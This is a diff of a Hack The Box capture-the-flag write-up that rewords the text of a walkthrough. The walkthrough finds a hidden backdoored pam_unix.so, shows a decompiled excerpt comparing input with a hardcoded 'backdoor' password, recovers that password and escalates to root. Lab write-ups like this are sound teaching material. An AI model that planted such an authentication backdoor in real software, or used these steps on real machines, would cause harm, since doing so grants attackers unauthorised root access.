+Plenty of hidden files showed up, but one really stood out:
 
 ```text
 -rw-r--r--   1 root     root       198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/.pam_unix.so
 ```
 
-PAM is the pluggable authentication module, and is what controls IAM for Linux machines. This shouldn't be a hidden file.
+PAM, the pluggable authentication module, handles identity and access management on Linux. It has no business being a hidden file.
 
 ```text
 sysadmin@compromised:/lib/x86_64-linux-gnu/security$ ls -la
@@ -910,7 +902,7 @@ drwxr-xr-x 4 root root  12288 Jul 16 19:36 ..
 -rw-r--r-- 1 root root  18848 Feb 27  2019 pam_xauth.so
 ```
 
-It was very suspicious that there were two versions of this file here, with one hidden.  Even more suspicious was the fact that though `pam_unix.so` and the hidden version were the same file size and had the same modify date, thedate was very different from the reset of the files here.
+Having two copies of this file present, one of them hidden, was highly suspicious. More suspicious still: `pam_unix.so` and its hidden twin shared the same size and modify date, yet that date was wildly different from every other file in the directory.
 
 ```text
 sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings .pam_unix.so | less
@@ -920,15 +912,15 @@ sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings pam_unix.so > /dev/
 sysadmin@compromised:/lib/x86_64-linux-gnu/security$ diff /dev/shm/pam /dev/shm/pam_hidden
 ```
 
-After doing some basic analysis with strings and finding nothing, I copied the files back to my machine with SCP to look a bit deeper.
+After basic strings analysis turned up nothing, I SCP'd the files back to my machine for a closer look.
 
 ### Using Ghidra for binary analysis
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-ghidra-little-endian.png)
+![](assets/wu/compromised/img-38.png)
 
-I opened the file in ghidra and started browsing through the code. Luckily the file was compiled with symbols and strings intact, which made browsing through the code much easier.
+I loaded the file into ghidra and began reading the code. Helpfully, it had been compiled with symbols and strings intact, which made navigating it far easier.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-ghidra-backdoor.png)
+![](assets/wu/compromised/img-39.png)
 
 ```c
   iVar2 = pam_get_user(pamh,&name,0);
@@ -945,7 +937,7 @@ I opened the file in ghidra and started browsing through the code. Luckily the f
           iVar2 = strcmp((char *)p,backdoor);
 ```
 
-After searching for a long time and questioning whether I was in a rabbit hole, I found what I needed in the `pam_sm_authenticate` function. The c code decompiled by ghidra showed a variable named `backdoor` which stood out to me immediately.
+After a long search, and some doubt about whether I was down a rabbit hole, I found what I needed in the `pam_sm_authenticate` function. Ghidra's decompiled C revealed a variable called `backdoor` that immediately caught my eye.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised]
@@ -956,9 +948,9 @@ E3U~eklz
 -2m28vn
 ```
 
-Based on the code in the assembly view, it looked like these two strings were concatenated to make the backdoor password. It then uses `strcmp` to compare the backdoor password to the input password and allows authentication if they match. It didn't hurt to try!
+From the assembly view, it appeared the two strings were joined together to form the backdoor password. The code then runs `strcmp` against the supplied password and grants authentication on a match. Worth a shot!
 
-It didn't work for switching users to root, but when looking at the code I had a thought. It said earlier that the code was little-endian, so...maybe the strings were backwards?
+It failed when I tried switching to root, but reading the code gave me an idea. Earlier it had noted the code was little-endian, so...maybe the strings were reversed?
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised]
@@ -969,7 +961,7 @@ zlke~U3E
 nv82m2-
 ```
 
-I combined the two halves of the password and tried to switch users to `root`.  
+I stitched the two halves of the password together and attempted to switch to `root`.  
 
 ### Getting a shell
 
@@ -984,7 +976,7 @@ uid=0(root) gid=0(root) groups=0(root)
 compromised
 ```
 
-And that was it! I was logged in as root.
+And that did it - I was now logged in as root.
 
 ### Root.txt
 
